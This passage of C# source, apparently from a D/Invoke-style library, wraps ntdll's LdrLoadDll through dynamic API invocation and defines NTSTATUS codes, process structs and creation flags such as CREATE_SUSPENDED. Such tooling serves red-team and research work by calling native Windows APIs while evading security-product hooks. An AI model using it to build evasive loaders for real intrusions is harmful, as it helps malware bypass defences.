			DestinationString = (STRUCTS.UNICODE_STRING)funcargs[0];
		}


		public static STRUCTS.NTSTATUS LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref STRUCTS.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)
		{
			// Craft an array for the arguments
			object[] funcargs =
			{
				PathToFile, dwFlags, ModuleFileName, ModuleHandle
			};

			STRUCTS.NTSTATUS retValue = (STRUCTS.NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"LdrLoadDll", typeof(DELEGATES.LdrLoadDll), ref funcargs);

			// Update the modified variables
			ModuleHandle = (IntPtr)funcargs[3];

			return retValue;
		}

	}

	// Corressponding structs and enums
	public class STRUCTS
	{

		//NTSTATUS is an undocument enum. https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55
		// https://dinvoke.net/en/ntdll/NTSTATUS
		public enum NTSTATUS : uint
		{
			// Success
			Success = 0x00000000,
			Wait1 = 0x00000001,
			Wait2 = 0x00000002,
			Wait3 = 0x00000003,
			Wait63 = 0x0000003f,
			Abandoned = 0x00000080,
			AbandonedWait0 = 0x00000080,
			AbandonedWait1 = 0x00000081,
			AbandonedWait2 = 0x00000082,
			AbandonedWait3 = 0x00000083,
			AbandonedWait63 = 0x000000bf,
			UserApc = 0x000000c0,
			KernelApc = 0x00000100,
			Alerted = 0x00000101,
			Timeout = 0x00000102,
			Pending = 0x00000103,
			Reparse = 0x00000104,
			MoreEntries = 0x00000105,
			NotAllAssigned = 0x00000106,
			SomeNotMapped = 0x00000107,
			OpLockBreakInProgress = 0x00000108,
			VolumeMounted = 0x00000109,
			RxActCommitted = 0x0000010a,
			NotifyCleanup = 0x0000010b,
			NotifyEnumDir = 0x0000010c,
			NoQuotasForAccount = 0x0000010d,
			PrimaryTransportConnectFailed = 0x0000010e,
			PageFaultTransition = 0x00000110,
			PageFaultDemandZero = 0x00000111,
			PageFaultCopyOnWrite = 0x00000112,
			PageFaultGuardPage = 0x00000113,
			PageFaultPagingFile = 0x00000114,
			CrashDump = 0x00000116,
			ReparseObject = 0x00000118,
			NothingToTerminate = 0x00000122,
			ProcessNotInJob = 0x00000123,
			ProcessInJob = 0x00000124,
			ProcessCloned = 0x00000129,
			FileLockedWithOnlyReaders = 0x0000012a,
			FileLockedWithWriters = 0x0000012b,

			// Informational
			Informational = 0x40000000,
			ObjectNameExists = 0x40000000,
			ThreadWasSuspended = 0x40000001,
			WorkingSetLimitRange = 0x40000002,
			ImageNotAtBase = 0x40000003,
			RegistryRecovered = 0x40000009,

			// Warning
			Warning = 0x80000000,
			GuardPageViolation = 0x80000001,
			DatatypeMisalignment = 0x80000002,
			Breakpoint = 0x80000003,
			SingleStep = 0x80000004,
			BufferOverflow = 0x80000005,
			NoMoreFiles = 0x80000006,
			HandlesClosed = 0x8000000a,
			PartialCopy = 0x8000000d,
			DeviceBusy = 0x80000011,
			InvalidEaName = 0x80000013,
			EaListInconsistent = 0x80000014,
			NoMoreEntries = 0x8000001a,
			LongJump = 0x80000026,
			DllMightBeInsecure = 0x8000002b,

			// Error
			Error = 0xc0000000,
			Unsuccessful = 0xc0000001,
			NotImplemented = 0xc0000002,
			InvalidInfoClass = 0xc0000003,
			InfoLengthMismatch = 0xc0000004,
			AccessViolation = 0xc0000005,
			InPageError = 0xc0000006,
			PagefileQuota = 0xc0000007,
			InvalidHandle = 0xc0000008,
			BadInitialStack = 0xc0000009,
			BadInitialPc = 0xc000000a,
			InvalidCid = 0xc000000b,
			TimerNotCanceled = 0xc000000c,
			InvalidParameter = 0xc000000d,
			NoSuchDevice = 0xc000000e,
			NoSuchFile = 0xc000000f,
			InvalidDeviceRequest = 0xc0000010,
			EndOfFile = 0xc0000011,
			WrongVolume = 0xc0000012,
			NoMediaInDevice = 0xc0000013,
			NoMemory = 0xc0000017,
			ConflictingAddresses = 0xc0000018,
			NotMappedView = 0xc0000019,
			UnableToFreeVm = 0xc000001a,
			UnableToDeleteSection = 0xc000001b,
			IllegalInstruction = 0xc000001d,
			AlreadyCommitted = 0xc0000021,
			AccessDenied = 0xc0000022,
			BufferTooSmall = 0xc0000023,
			ObjectTypeMismatch = 0xc0000024,
			NonContinuableException = 0xc0000025,
			BadStack = 0xc0000028,
			NotLocked = 0xc000002a,
			NotCommitted = 0xc000002d,
			InvalidParameterMix = 0xc0000030,
			ObjectNameInvalid = 0xc0000033,
			ObjectNameNotFound = 0xc0000034,
			ObjectNameCollision = 0xc0000035,
			ObjectPathInvalid = 0xc0000039,
			ObjectPathNotFound = 0xc000003a,
			ObjectPathSyntaxBad = 0xc000003b,
			DataOverrun = 0xc000003c,
			DataLate = 0xc000003d,
			DataError = 0xc000003e,
			CrcError = 0xc000003f,
			SectionTooBig = 0xc0000040,
			PortConnectionRefused = 0xc0000041,
			InvalidPortHandle = 0xc0000042,
			SharingViolation = 0xc0000043,
			QuotaExceeded = 0xc0000044,
			InvalidPageProtection = 0xc0000045,
			MutantNotOwned = 0xc0000046,
			SemaphoreLimitExceeded = 0xc0000047,
			PortAlreadySet = 0xc0000048,
			SectionNotImage = 0xc0000049,
			SuspendCountExceeded = 0xc000004a,
			ThreadIsTerminating = 0xc000004b,
			BadWorkingSetLimit = 0xc000004c,
			IncompatibleFileMap = 0xc000004d,
			SectionProtection = 0xc000004e,
			EasNotSupported = 0xc000004f,
			EaTooLarge = 0xc0000050,
			NonExistentEaEntry = 0xc0000051,
			NoEasOnFile = 0xc0000052,
			EaCorruptError = 0xc0000053,
			FileLockConflict = 0xc0000054,
			LockNotGranted = 0xc0000055,
			DeletePending = 0xc0000056,
			CtlFileNotSupported = 0xc0000057,
			UnknownRevision = 0xc0000058,
			RevisionMismatch = 0xc0000059,
			InvalidOwner = 0xc000005a,
			InvalidPrimaryGroup = 0xc000005b,
			NoImpersonationToken = 0xc000005c,
			CantDisableMandatory = 0xc000005d,
			NoLogonServers = 0xc000005e,
			NoSuchLogonSession = 0xc000005f,
			NoSuchPrivilege = 0xc0000060,
			PrivilegeNotHeld = 0xc0000061,
			InvalidAccountName = 0xc0000062,
			UserExists = 0xc0000063,
			NoSuchUser = 0xc0000064,
			GroupExists = 0xc0000065,
			NoSuchGroup = 0xc0000066,
			MemberInGroup = 0xc0000067,
			MemberNotInGroup = 0xc0000068,
			LastAdmin = 0xc0000069,
			WrongPassword = 0xc000006a,
			IllFormedPassword = 0xc000006b,
			PasswordRestriction = 0xc000006c,
			LogonFailure = 0xc000006d,
			AccountRestriction = 0xc000006e,
			InvalidLogonHours = 0xc000006f,
			InvalidWorkstation = 0xc0000070,
			PasswordExpired = 0xc0000071,
			AccountDisabled = 0xc0000072,
			NoneMapped = 0xc0000073,
			TooManyLuidsRequested = 0xc0000074,
			LuidsExhausted = 0xc0000075,
			InvalidSubAuthority = 0xc0000076,
			InvalidAcl = 0xc0000077,
			InvalidSid = 0xc0000078,
			InvalidSecurityDescr = 0xc0000079,
			ProcedureNotFound = 0xc000007a,
			InvalidImageFormat = 0xc000007b,
			NoToken = 0xc000007c,
			BadInheritanceAcl = 0xc000007d,
			RangeNotLocked = 0xc000007e,
			DiskFull = 0xc000007f,
			ServerDisabled = 0xc0000080,
			ServerNotDisabled = 0xc0000081,
			TooManyGuidsRequested = 0xc0000082,
			GuidsExhausted = 0xc0000083,
			InvalidIdAuthority = 0xc0000084,
			AgentsExhausted = 0xc0000085,
			InvalidVolumeLabel = 0xc0000086,
			SectionNotExtended = 0xc0000087,
			NotMappedData = 0xc0000088,
			ResourceDataNotFound = 0xc0000089,
			ResourceTypeNotFound = 0xc000008a,
			ResourceNameNotFound = 0xc000008b,
			ArrayBoundsExceeded = 0xc000008c,
			FloatDenormalOperand = 0xc000008d,
			FloatDivideByZero = 0xc000008e,
			FloatInexactResult = 0xc000008f,
			FloatInvalidOperation = 0xc0000090,
			FloatOverflow = 0xc0000091,
			FloatStackCheck = 0xc0000092,
			FloatUnderflow = 0xc0000093,
			IntegerDivideByZero = 0xc0000094,
			IntegerOverflow = 0xc0000095,
			PrivilegedInstruction = 0xc0000096,
			TooManyPagingFiles = 0xc0000097,
			FileInvalid = 0xc0000098,
			InsufficientResources = 0xc000009a,
			InstanceNotAvailable = 0xc00000ab,
			PipeNotAvailable = 0xc00000ac,
			InvalidPipeState = 0xc00000ad,
			PipeBusy = 0xc00000ae,
			IllegalFunction = 0xc00000af,
			PipeDisconnected = 0xc00000b0,
			PipeClosing = 0xc00000b1,
			PipeConnected = 0xc00000b2,
			PipeListening = 0xc00000b3,
			InvalidReadMode = 0xc00000b4,
			IoTimeout = 0xc00000b5,
			FileForcedClosed = 0xc00000b6,
			ProfilingNotStarted = 0xc00000b7,
			ProfilingNotStopped = 0xc00000b8,
			NotSameDevice = 0xc00000d4,
			FileRenamed = 0xc00000d5,
			CantWait = 0xc00000d8,
			PipeEmpty = 0xc00000d9,
			CantTerminateSelf = 0xc00000db,
			InternalError = 0xc00000e5,
			InvalidParameter1 = 0xc00000ef,
			InvalidParameter2 = 0xc00000f0,
			InvalidParameter3 = 0xc00000f1,
			InvalidParameter4 = 0xc00000f2,
			InvalidParameter5 = 0xc00000f3,
			InvalidParameter6 = 0xc00000f4,
			InvalidParameter7 = 0xc00000f5,
			InvalidParameter8 = 0xc00000f6,
			InvalidParameter9 = 0xc00000f7,
			InvalidParameter10 = 0xc00000f8,
			InvalidParameter11 = 0xc00000f9,
			InvalidParameter12 = 0xc00000fa,
			ProcessIsTerminating = 0xc000010a,
			MappedFileSizeZero = 0xc000011e,
			TooManyOpenedFiles = 0xc000011f,
			Cancelled = 0xc0000120,
			CannotDelete = 0xc0000121,
			InvalidComputerName = 0xc0000122,
			FileDeleted = 0xc0000123,
			SpecialAccount = 0xc0000124,
			SpecialGroup = 0xc0000125,
			SpecialUser = 0xc0000126,
			MembersPrimaryGroup = 0xc0000127,
			FileClosed = 0xc0000128,
			TooManyThreads = 0xc0000129,
			ThreadNotInProcess = 0xc000012a,
			TokenAlreadyInUse = 0xc000012b,
			PagefileQuotaExceeded = 0xc000012c,
			CommitmentLimit = 0xc000012d,
			InvalidImageLeFormat = 0xc000012e,
			InvalidImageNotMz = 0xc000012f,
			InvalidImageProtect = 0xc0000130,
			InvalidImageWin16 = 0xc0000131,
			LogonServer = 0xc0000132,
			DifferenceAtDc = 0xc0000133,
			SynchronizationRequired = 0xc0000134,
			DllNotFound = 0xc0000135,
			IoPrivilegeFailed = 0xc0000137,
			OrdinalNotFound = 0xc0000138,
			EntryPointNotFound = 0xc0000139,
			ControlCExit = 0xc000013a,
			InvalidAddress = 0xc0000141,
			PortNotSet = 0xc0000353,
			DebuggerInactive = 0xc0000354,
			CallbackBypass = 0xc0000503,
			PortClosed = 0xc0000700,
			MessageLost = 0xc0000701,
			InvalidMessage = 0xc0000702,
			RequestCanceled = 0xc0000703,
			RecursiveDispatch = 0xc0000704,
			LpcReceiveBufferExpected = 0xc0000705,
			LpcInvalidConnectionUsage = 0xc0000706,
			LpcRequestsNotAllowed = 0xc0000707,
			ResourceInUse = 0xc0000708,
			ProcessIsProtected = 0xc0000712,
			VolumeDirty = 0xc0000806,
			FileCheckedOut = 0xc0000901,
			CheckOutRequired = 0xc0000902,
			BadFileType = 0xc0000903,
			FileTooLarge = 0xc0000904,
			FormsAuthRequired = 0xc0000905,
			VirusInfected = 0xc0000906,
			VirusDeleted = 0xc0000907,
			TransactionalConflict = 0xc0190001,
			InvalidTransaction = 0xc0190002,
			TransactionNotActive = 0xc0190003,
			TmInitializationFailed = 0xc0190004,
			RmNotActive = 0xc0190005,
			RmMetadataCorrupt = 0xc0190006,
			TransactionNotJoined = 0xc0190007,
			DirectoryNotRm = 0xc0190008,
			CouldNotResizeLog = 0xc0190009,
			TransactionsUnsupportedRemote = 0xc019000a,
			LogResizeInvalidSize = 0xc019000b,
			RemoteFileVersionMismatch = 0xc019000c,
			CrmProtocolAlreadyExists = 0xc019000f,
			TransactionPropagationFailed = 0xc0190010,
			CrmProtocolNotFound = 0xc0190011,
			TransactionSuperiorExists = 0xc0190012,
			TransactionRequestNotValid = 0xc0190013,
			TransactionNotRequested = 0xc0190014,
			TransactionAlreadyAborted = 0xc0190015,
			TransactionAlreadyCommitted = 0xc0190016,
			TransactionInvalidMarshallBuffer = 0xc0190017,
			CurrentTransactionNotValid = 0xc0190018,
			LogGrowthFailed = 0xc0190019,
			ObjectNoLongerExists = 0xc0190021,
			StreamMiniversionNotFound = 0xc0190022,
			StreamMiniversionNotValid = 0xc0190023,
			MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
			CantOpenMiniversionWithModifyIntent = 0xc0190025,
			CantCreateMoreStreamMiniversions = 0xc0190026,
			HandleNoLongerValid = 0xc0190028,
			NoTxfMetadata = 0xc0190029,
			LogCorruptionDetected = 0xc0190030,
			CantRecoverWithHandleOpen = 0xc0190031,
			RmDisconnected = 0xc0190032,
			EnlistmentNotSuperior = 0xc0190033,
			RecoveryNotNeeded = 0xc0190034,
			RmAlreadyStarted = 0xc0190035,
			FileIdentityNotPersistent = 0xc0190036,
			CantBreakTransactionalDependency = 0xc0190037,
			CantCrossRmBoundary = 0xc0190038,
			TxfDirNotEmpty = 0xc0190039,
			IndoubtTransactionsExist = 0xc019003a,
			TmVolatile = 0xc019003b,
			RollbackTimerExpired = 0xc019003c,
			TxfAttributeCorrupt = 0xc019003d,
			EfsNotAllowedInTransaction = 0xc019003e,
			TransactionalOpenNotAllowed = 0xc019003f,
			TransactedMappingUnsupportedRemote = 0xc0190040,
			TxfMetadataAlreadyPresent = 0xc0190041,
			TransactionScopeCallbacksNotSet = 0xc0190042,
			TransactionRequiredPromotion = 0xc0190043,
			CannotExecuteFileInTransaction = 0xc0190044,
			TransactionsNotFrozen = 0xc0190045,

			MaximumNtStatus = 0xffffffff
		}

		[StructLayout(LayoutKind.Sequential)]
		public struct UNICODE_STRING
		{
			public UInt16 Length;
			public UInt16 MaximumLength;
			public IntPtr Buffer;
		}

		public struct PROCESS_INFORMATION
		{
			public IntPtr hProcess;
			public IntPtr hThread;
			public uint dwProcessId;
			public uint dwThreadId;
		}

		public struct STARTUPINFO
		{
			public uint cb;
			public string lpReserved;
			public string lpDesktop;
			public string lpTitle;
			public uint dwX;
			public uint dwY;
			public uint dwXSize;
			public uint dwYSize;
			public uint dwXCountChars;
			public uint dwYCountChars;
			public uint dwFillAttribute;
			public uint dwFlags;
			public short wShowWindow;
			public short cbReserved2;
			public IntPtr lpReserved2;
			public IntPtr hStdInput;
			public IntPtr hStdOutput;
			public IntPtr hStdError;
		}

		[Flags]
		public enum ProcessCreationFlags : uint
		{
			ZERO_FLAG = 0x00000000,
			CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
			CREATE_DEFAULT_ERROR_MODE = 0x04000000,
			CREATE_NEW_CONSOLE = 0x00000010,
			CREATE_NEW_PROCESS_GROUP = 0x00000200,
			CREATE_NO_WINDOW = 0x08000000,
			CREATE_PROTECTED_PROCESS = 0x00040000,
			CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
			CREATE_SEPARATE_WOW_VDM = 0x00001000,
			CREATE_SHARED_WOW_VDM = 0x00001000,
			CREATE_SUSPENDED = 0x00000004,
			CREATE_UNICODE_ENVIRONMENT = 0x00000400,
			DEBUG_ONLY_THIS_PROCESS = 0x00000002,
			DEBUG_PROCESS = 0x00000001,
			DETACHED_PROCESS = 0x00000008,
			EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
			INHERIT_PARENT_AFFINITY = 0x00010000
		}
	}
}
```

